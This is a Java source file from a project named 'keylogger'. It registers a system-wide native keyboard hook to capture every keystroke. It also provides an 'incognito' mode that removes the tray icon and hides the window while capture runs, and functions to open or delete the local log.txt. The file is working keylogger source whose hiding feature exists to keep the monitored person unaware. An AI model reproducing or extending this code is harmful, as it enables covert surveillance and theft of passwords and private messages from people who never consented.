
package keylogger;

import java.awt.AWTException;
import java.awt.Desktop;
import java.awt.Frame;
import java.awt.SystemTray;
import java.awt.TrayIcon;
import java.io.File;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JOptionPane;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;


public class KeyFunctions {
    public static boolean isListening = false;
    private static KeyLogger keyListener;
    
    static
    {
     keyListener=new KeyLogger();
    }
      
    
    public static void startListen(Frame frame){
        try {
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(keyListener);
        } catch (NativeHookException ex) {
            JOptionPane.showMessageDialog(frame, "Error in start method");
        }
        
    }
    public static void stopListen(Frame frame){
        try {
            GlobalScreen.unregisterNativeHook();
            GlobalScreen.removeNativeKeyListener(keyListener);
        } catch (NativeHookException ex) {
            JOptionPane.showMessageDialog(frame, "Error in stop method");
        }
        
    }
    
    public static void minimizeToTray(Frame frame){
        // minimize:
        
        int state = frame.getExtendedState(); // get current state
        state = state | Frame.ICONIFIED; // add minimized to the state
        frame.setExtendedState(state); // set that state
        frame.setVisible(false);
    }
    
    public static void maximizeFromTray(Frame frame){
        // restore
        int state;
        state = frame.getExtendedState();
        state = state & ~Frame.ICONIFIED; // remove minimized from the state
        frame.setExtendedState(state);
        frame.setVisible(true);
    }
    public static void incognito(Frame frame,SystemTray st,TrayIcon myTray){
        if(isListening){
            st.remove(myTray);
            frame.setVisible(false);
        }else{
            JOptionPane.showMessageDialog(frame, "You need to start listening to go incognito");
        }
    }

    public static void visible(Frame frame,SystemTray st,TrayIcon myTray){
            try {
                st.add(myTray);
            } catch (AWTException ex) {
                Logger.getLogger(KeyFunctions.class.getName()).log(Level.SEVERE, null, ex);
            }
            frame.setVisible(true);
        
    }
    public static void clearLog(Frame frame){
        File file = new File("log.txt");
        if(file.exists()){
            file.delete();
            JOptionPane.showMessageDialog(frame, "Log cleared!");
        }
    }
    public static void openLog(Frame frame){
        File file = new File("log.txt");
        Desktop desktop = Desktop.getDesktop();
        if(file.exists()){
            try {
                desktop.open(file);
            } catch (IOException ex) {
                JOptionPane.showMessageDialog(frame, "Log is empty!");
            }
        }else{
            JOptionPane.showMessageDialog(frame, "Log is empty!");
        }
    }
    public static void exit(){
        System.exit(0);
    }
    
}